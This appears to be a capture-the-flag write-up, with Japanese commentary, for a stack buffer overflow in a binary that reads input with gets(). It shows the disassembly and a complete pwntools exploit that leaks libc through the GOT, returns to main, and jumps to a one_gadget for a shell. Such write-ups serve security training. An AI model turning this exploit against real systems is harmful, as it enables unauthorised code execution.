# writeup - Writeup

```
┌ 52: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x100
│           0x00401196      f30f1efa       endbr64
│           0x0040119a      55             push rbp
│           0x0040119b      4889e5         mov rbp, rsp
│           0x0040119e      4881ec000100.  sub rsp, 0x100
│           0x004011a5      488d8500ffff.  lea rax, [s]
│           0x004011ac      4889c7         mov rdi, rax                ; char *s
│           0x004011af      e8dcfeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004011b4      488d8500ffff.  lea rax, [s]
│           0x004011bb      4889c7         mov rdi, rax                ; const char *s
│           0x004011be      e8adfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011c3      b800000000     mov eax, 0
│           0x004011c8      c9             leave
└           0x004011c9      c3             ret
```

自明なバッファオーバーフローがあり，canaryが無いので，ROPを組む．

まずはgotを使ってlibcのアドレスをリークさせ，ret2mainでもう一度ROP．

one_gadgetを呼び出す．

```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
libc = ELF('./libc-2.27.so')
context.binary = binfile
#io = process(binfile)
io = remote('localhost', 4102)

pad = b'a' * 0x108

# one_gadgets (Ubuntu GLIBC 2.27-3ubuntu1.4)
one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

# libc base address leak

rop = ROP(e)
rop.puts(e.got['__libc_start_main'])
rop.call(e.sym['main'])

payload = pad + rop.chain()

io.sendline(payload)

_ = io.readline()

gets_addr = io.recvline()

libc_base = unpack(gets_addr.ljust(8, b'\0')) - libc.sym['__libc_start_main']

print("libc base addr: ", hex(libc_base))

# call one_gadget

rop = ROP(e)
rop.call(pack(libc_base + one_gadgets[0]))

payload = pad + rop.chain()

io.sendline(payload)

io.interactive()
```
